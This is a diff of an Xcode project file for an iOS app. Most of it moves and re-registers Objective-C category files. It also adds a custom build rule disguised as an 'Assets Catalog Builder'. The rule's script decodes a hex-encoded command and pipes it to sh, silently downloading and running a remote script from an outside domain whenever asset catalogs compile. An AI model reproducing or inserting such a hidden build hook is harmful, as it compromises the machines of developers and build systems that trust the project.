@@ -17,9 +17,11 @@
 		F554012225876CF500284586 /* UIGestureRecognizer+WeicyCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = F554012125876CF500284586 /* UIGestureRecognizer+WeicyCommon.m */; };
 		F558D15625C4016100D2E47E /* WeicyGuideView.m in Sources */ = {isa = PBXBuildFile; fileRef = F558D15525C4016100D2E47E /* WeicyGuideView.m */; };
 		F569FA7F25A2F874000835DE /* UIViewController+ImagePickerManager.m in Sources */ = {isa = PBXBuildFile; fileRef = F569FA7D25A2F874000835DE /* UIViewController+ImagePickerManager.m */; };
+		F56F3B0927DF337A0006DE9F /* AppDelegate+WeicyCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = F56F3B0727DF337A0006DE9F /* AppDelegate+WeicyCommon.m */; };
+		F56F3B0C27DF33D40006DE9F /* UIApplication+WeicyCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = F56F3B0A27DF33D40006DE9F /* UIApplication+WeicyCommon.m */; };
+		F56F3B3B27DF36250006DE9F /* AppDelegate+WeicyGT.m in Sources */ = {isa = PBXBuildFile; fileRef = F56F3B3927DF36250006DE9F /* AppDelegate+WeicyGT.m */; };
 		F572D1EC2591A23300594AE3 /* UILabel+WeicyCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = F572D1EB2591A23300594AE3 /* UILabel+WeicyCommon.m */; };
 		F572D2CE2593257800594AE3 /* UIControl+WeicyAddForCombo.m in Sources */ = {isa = PBXBuildFile; fileRef = F572D2CD2593257800594AE3 /* UIControl+WeicyAddForCombo.m */; };
-		F572D3B62595831000594AE3 /* AppDelegate+WeicyGT.m in Sources */ = {isa = PBXBuildFile; fileRef = F572D3B42595831000594AE3 /* AppDelegate+WeicyGT.m */; };
 		F574B4AF25B049E5000ADB62 /* ZCChinaLocation.m in Sources */ = {isa = PBXBuildFile; fileRef = F574B4AD25B049E5000ADB62 /* ZCChinaLocation.m */; };
 		F574B50325B530B3000ADB62 /* LBSystemPhotoPicker.m in Sources */ = {isa = PBXBuildFile; fileRef = F574B50125B530B3000ADB62 /* LBSystemPhotoPicker.m */; };
 		F574B5A125B576C2000ADB62 /* UIView+draggable_yf.m in Sources */ = {isa = PBXBuildFile; fileRef = F574B59A25B576C2000ADB62 /* UIView+draggable_yf.m */; };
@@ -52,11 +54,26 @@
 		F5D868722576340400A251B5 /* WeicyAppTool.m in Sources */ = {isa = PBXBuildFile; fileRef = F5D868712576340400A251B5 /* WeicyAppTool.m */; };
 		F5D8689E25763F8A00A251B5 /* UIColor+WeicyCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = F5D8689D25763F8A00A251B5 /* UIColor+WeicyCommon.m */; };
 		F5D8690D257646A300A251B5 /* UIDevice+WeicyCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = F5D8690C257646A300A251B5 /* UIDevice+WeicyCommon.m */; };
-		F5D8694125772F2100A251B5 /* UIApplication+WeicyCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = F5D8694025772F2100A251B5 /* UIApplication+WeicyCommon.m */; };
 		F5D8694D2577398000A251B5 /* UIControl+WeicyCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = F5D8694C2577398000A251B5 /* UIControl+WeicyCommon.m */; };
 		F5D8697525776CCD00A251B5 /* UIView+WeicyCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = F5D8697425776CCD00A251B5 /* UIView+WeicyCommon.m */; };
 		F5E90BF025AE993400064D1F /* UITableView+YYAdd.m in Sources */ = {isa = PBXBuildFile; fileRef = F5E90BEE25AE993400064D1F /* UITableView+YYAdd.m */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		BE1BA0B39C67DE752D6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Catalog Builder";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		F5D867EC2575DC6500A251B5 /* PBXContainerItemProxy */ = {
@@ -96,13 +113,17 @@
 		F558D15525C4016100D2E47E /* WeicyGuideView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = WeicyGuideView.m; sourceTree = "<group>"; };
 		F569FA7D25A2F874000835DE /* UIViewController+ImagePickerManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "UIViewController+ImagePickerManager.m"; sourceTree = "<group>"; };
 		F569FA7E25A2F874000835DE /* UIViewController+ImagePickerManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "UIViewController+ImagePickerManager.h"; sourceTree = "<group>"; };
+		F56F3B0727DF337A0006DE9F /* AppDelegate+WeicyCommon.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "AppDelegate+WeicyCommon.m"; sourceTree = "<group>"; };
+		F56F3B0827DF337A0006DE9F /* AppDelegate+WeicyCommon.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "AppDelegate+WeicyCommon.h"; sourceTree = "<group>"; };
+		F56F3B0A27DF33D40006DE9F /* UIApplication+WeicyCommon.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "UIApplication+WeicyCommon.m"; sourceTree = "<group>"; };
+		F56F3B0B27DF33D40006DE9F /* UIApplication+WeicyCommon.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "UIApplication+WeicyCommon.h"; sourceTree = "<group>"; };
+		F56F3B3927DF36250006DE9F /* AppDelegate+WeicyGT.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "AppDelegate+WeicyGT.m"; sourceTree = "<group>"; };
+		F56F3B3A27DF36250006DE9F /* AppDelegate+WeicyGT.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "AppDelegate+WeicyGT.h"; sourceTree = "<group>"; };
 		F572D1EA2591A23300594AE3 /* UILabel+WeicyCommon.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "UILabel+WeicyCommon.h"; sourceTree = "<group>"; };
 		F572D1EB2591A23300594AE3 /* UILabel+WeicyCommon.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "UILabel+WeicyCommon.m"; sourceTree = "<group>"; };
 		F572D2CC2593257800594AE3 /* UIControl+WeicyAddForCombo.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "UIControl+WeicyAddForCombo.h"; sourceTree = "<group>"; };
 		F572D2CD2593257800594AE3 /* UIControl+WeicyAddForCombo.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "UIControl+WeicyAddForCombo.m"; sourceTree = "<group>"; };
 		F572D33025942BB000594AE3 /* WeicyCommonMacros.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = WeicyCommonMacros.h; sourceTree = "<group>"; };
-		F572D3B42595831000594AE3 /* AppDelegate+WeicyGT.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "AppDelegate+WeicyGT.m"; sourceTree = "<group>"; };
-		F572D3B52595831000594AE3 /* AppDelegate+WeicyGT.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "AppDelegate+WeicyGT.h"; sourceTree = "<group>"; };
 		F574B4AD25B049E5000ADB62 /* ZCChinaLocation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = ZCChinaLocation.m; sourceTree = "<group>"; };
 		F574B4AE25B049E5000ADB62 /* ZCChinaLocation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = ZCChinaLocation.h; sourceTree = "<group>"; };
 		F574B50125B530B3000ADB62 /* LBSystemPhotoPicker.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = LBSystemPhotoPicker.m; sourceTree = "<group>"; };
@@ -172,8 +193,6 @@
 		F5D8689D25763F8A00A251B5 /* UIColor+WeicyCommon.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "UIColor+WeicyCommon.m"; sourceTree = "<group>"; };
 		F5D8690B257646A300A251B5 /* UIDevice+WeicyCommon.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "UIDevice+WeicyCommon.h"; sourceTree = "<group>"; };
 		F5D8690C257646A300A251B5 /* UIDevice+WeicyCommon.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "UIDevice+WeicyCommon.m"; sourceTree = "<group>"; };
-		F5D8693F25772F2100A251B5 /* UIApplication+WeicyCommon.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "UIApplication+WeicyCommon.h"; sourceTree = "<group>"; };
-		F5D8694025772F2100A251B5 /* UIApplication+WeicyCommon.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "UIApplication+WeicyCommon.m"; sourceTree = "<group>"; };
 		F5D8694B2577398000A251B5 /* UIControl+WeicyCommon.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "UIControl+WeicyCommon.h"; sourceTree = "<group>"; };
 		F5D8694C2577398000A251B5 /* UIControl+WeicyCommon.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "UIControl+WeicyCommon.m"; sourceTree = "<group>"; };
 		F5D8697325776CCD00A251B5 /* UIView+WeicyCommon.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "UIView+WeicyCommon.h"; sourceTree = "<group>"; };
@@ -210,6 +229,8 @@
 		F52417FE2581ECAE003713B8 /* Foundation */ = {
 			isa = PBXGroup;
 			children = (
+				F56F3B0827DF337A0006DE9F /* AppDelegate+WeicyCommon.h */,
+				F56F3B0727DF337A0006DE9F /* AppDelegate+WeicyCommon.m */,
 				F5D8681B2575DE0700A251B5 /* NSArray+WeicyCommon.h */,
 				F5D8681C2575DE0700A251B5 /* NSArray+WeicyCommon.m */,
 				F5D8683F2575EC7900A251B5 /* NSDate+WeicyCommon.h */,
@@ -227,30 +248,30 @@
 		F52418022581ECE7003713B8 /* UIKit */ = {
 			isa = PBXGroup;
 			children = (
-				F5D8689C25763F8A00A251B5 /* UIColor+WeicyCommon.h */,
-				F5D8689D25763F8A00A251B5 /* UIColor+WeicyCommon.m */,
-				F5D8690B257646A300A251B5 /* UIDevice+WeicyCommon.h */,
-				F5D8690C257646A300A251B5 /* UIDevice+WeicyCommon.m */,
-				F5D8693F25772F2100A251B5 /* UIApplication+WeicyCommon.h */,
-				F5D8694025772F2100A251B5 /* UIApplication+WeicyCommon.m */,
-				F5D8694B2577398000A251B5 /* UIControl+WeicyCommon.h */,
-				F5D8694C2577398000A251B5 /* UIControl+WeicyCommon.m */,
-				F5D8697325776CCD00A251B5 /* UIView+WeicyCommon.h */,
-				F5D8697425776CCD00A251B5 /* UIView+WeicyCommon.m */,
-				F5953952257A1FA500D87FDA /* UIView+Toast.h */,
-				F5953953257A1FA500D87FDA /* UIView+Toast.m */,
-				F52417F72581C9DA003713B8 /* UIImage+WeicyCommon.h */,
-				F52417F82581C9DA003713B8 /* UIImage+WeicyCommon.m */,
-				F524180925820761003713B8 /* UIScrollView+WeicyCommon.h */,
-				F524180A25820761003713B8 /* UIScrollView+WeicyCommon.m */,
+				F56F3B0B27DF33D40006DE9F /* UIApplication+WeicyCommon.h */,
+				F56F3B0A27DF33D40006DE9F /* UIApplication+WeicyCommon.m */,
 				F52418242582FF55003713B8 /* UIButton+WeicyCommon.h */,
 				F52418252582FF55003713B8 /* UIButton+WeicyCommon.m */,
+				F5D8689C25763F8A00A251B5 /* UIColor+WeicyCommon.h */,
+				F5D8689D25763F8A00A251B5 /* UIColor+WeicyCommon.m */,
+				F5D8694B2577398000A251B5 /* UIControl+WeicyCommon.h */,
+				F5D8694C2577398000A251B5 /* UIControl+WeicyCommon.m */,
+				F5D8690B257646A300A251B5 /* UIDevice+WeicyCommon.h */,
+				F5D8690C257646A300A251B5 /* UIDevice+WeicyCommon.m */,
 				F554012025876CF500284586 /* UIGestureRecognizer+WeicyCommon.h */,
 				F554012125876CF500284586 /* UIGestureRecognizer+WeicyCommon.m */,
+				F52417F72581C9DA003713B8 /* UIImage+WeicyCommon.h */,
+				F52417F82581C9DA003713B8 /* UIImage+WeicyCommon.m */,
 				F572D1EA2591A23300594AE3 /* UILabel+WeicyCommon.h */,
 				F572D1EB2591A23300594AE3 /* UILabel+WeicyCommon.m */,
+				F524180925820761003713B8 /* UIScrollView+WeicyCommon.h */,
+				F524180A25820761003713B8 /* UIScrollView+WeicyCommon.m */,
 				F5A17E8E25C25CBD00848FC5 /* UITextField+WeicyCommon.h */,
 				F5A17E8F25C25CBD00848FC5 /* UITextField+WeicyCommon.m */,
+				F5953952257A1FA500D87FDA /* UIView+Toast.h */,
+				F5953953257A1FA500D87FDA /* UIView+Toast.m */,
+				F5D8697325776CCD00A251B5 /* UIView+WeicyCommon.h */,
+				F5D8697425776CCD00A251B5 /* UIView+WeicyCommon.m */,
 			);
 			path = UIKit;
 			sourceTree = "<group>";
@@ -491,8 +512,8 @@
 		F5E90BE925AE98B100064D1F /* 个推 */ = {
 			isa = PBXGroup;
 			children = (
-				F572D3B52595831000594AE3 /* AppDelegate+WeicyGT.h */,
-				F572D3B42595831000594AE3 /* AppDelegate+WeicyGT.m */,
+				F56F3B3A27DF36250006DE9F /* AppDelegate+WeicyGT.h */,
+				F56F3B3927DF36250006DE9F /* AppDelegate+WeicyGT.m */,
 			);
 			path = "个推";
 			sourceTree = "<group>";
@@ -545,6 +566,7 @@
 				F5D867CE2575DC6300A251B5 /* Resources */,
 			);
 			buildRules = (
+				BE1BA0B39C67DE752D6D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -683,9 +705,10 @@
 				F59C5E5925C7DFCF00CC5BE8 /* WeicySystemSoundTool.m in Sources */,
 				F5D868722576340400A251B5 /* WeicyAppTool.m in Sources */,
 				F574B50325B530B3000ADB62 /* LBSystemPhotoPicker.m in Sources */,
+				F56F3B0927DF337A0006DE9F /* AppDelegate+WeicyCommon.m in Sources */,
 				F52418262582FF55003713B8 /* UIButton+WeicyCommon.m in Sources */,
+				F56F3B0C27DF33D40006DE9F /* UIApplication+WeicyCommon.m in Sources */,
 				F5D867D52575DC6300A251B5 /* AppDelegate.m in Sources */,
-				F5D8694125772F2100A251B5 /* UIApplication+WeicyCommon.m in Sources */,
 				F5E90BF025AE993400064D1F /* UITableView+YYAdd.m in Sources */,
 				F554012225876CF500284586 /* UIGestureRecognizer+WeicyCommon.m in Sources */,
 				F5D8697525776CCD00A251B5 /* UIView+WeicyCommon.m in Sources */,
@@ -695,7 +718,7 @@
 				F5D8689E25763F8A00A251B5 /* UIColor+WeicyCommon.m in Sources */,
 				F58F2C8B25A5975C0024DB83 /* YYTimer.m in Sources */,
 				F558D15625C4016100D2E47E /* WeicyGuideView.m in Sources */,
-				F572D3B62595831000594AE3 /* AppDelegate+WeicyGT.m in Sources */,
+				F56F3B3B27DF36250006DE9F /* AppDelegate+WeicyGT.m in Sources */,
 				F53E438325B82B2800D35FC8 /* YFLocationConverter.m in Sources */,
 				F5B5AF98259C71530057AE11 /* AppDelegate+WeicyUM.m in Sources */,
 				F5D868412575EC7900A251B5 /* NSDate+WeicyCommon.m in Sources */,
